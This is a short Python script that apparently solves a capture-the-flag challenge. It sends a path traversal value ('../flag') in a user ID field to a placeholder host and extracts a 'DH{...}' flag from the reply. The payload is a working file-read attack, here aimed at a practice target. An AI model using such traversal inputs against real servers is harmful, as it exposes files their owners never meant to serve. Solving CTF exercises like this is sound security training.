import re
import requests

host = 'https://example.com'
data = 'userid=../flag'
flag = requests.post(host, data=data)
print(re.search(r'DH{.*?}', flag.text).group())
